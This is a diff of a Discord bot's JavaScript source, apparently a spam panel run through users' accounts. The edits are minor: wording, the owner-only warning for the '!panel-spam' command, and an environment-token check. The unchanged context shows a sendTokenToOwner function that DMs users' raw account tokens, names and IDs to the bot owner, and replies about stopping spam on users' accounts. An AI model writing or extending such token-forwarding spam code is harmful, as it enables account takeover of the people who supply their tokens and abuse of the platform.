@@ -63,7 +63,7 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
     if (owner) {
       await owner.send(
         `📥 **${title}**\n` +
-        `👤 **Hesap:** ${accountName} (${username})\n` +
+        `👤 **Hesab:** ${accountName} (${username})\n` +
         `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
         `🔑 **Token:** \`${token}\``
       );
@@ -78,15 +78,24 @@ client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
   if (message.content === '!panel-spam') {
-    // Səlahiyyəti olmayanın mesajı silinir, xəta atılır və 5 saniyə sonra silinir
+    // Səlahiyyəti yoxdursa
     if (message.author.id !== OWNER_ID) {
-      try { await message.delete(); } catch (e) {}
-      const replyMsg = await message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.' }).catch(() => {});
-      if (replyMsg) {
+      try {
+        // Yazılan mesajı silirik
+        await message.delete();
+      } catch (e) {}
+
+      // Xəbərdarlıq mesajı göndəririk və 5 saniyə sonra silirik
+      try {
+        const warningMsg = await message.channel.send({ 
+          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
+        });
+        
         setTimeout(async () => {
-          try { await replyMsg.delete(); } catch (e) {}
-        }, 5000);
-      }
+          try { await warningMsg.delete(); } catch (err) {}
+        }, 5000); // 5000 millisaniyə = 5 saniyə
+      } catch (err) {}
+
       return;
     }
 
@@ -465,5 +474,11 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: '🛑 Hesaplarınızdaki bütün aktif spamlar durduruldu.', ephemeral: true });
   }
 });
+
+// Render-də token yoxlanışı ilə giriş
+if (!process.env.DISCORD_TOKEN) {
+  console.error("❌ HATA: DISCORD_TOKEN environment dəyişəni tapılmadı! Render panelindən əlavə edin.");
+  process.exit(1);
+}
 
 client.login(process.env.DISCORD_TOKEN);
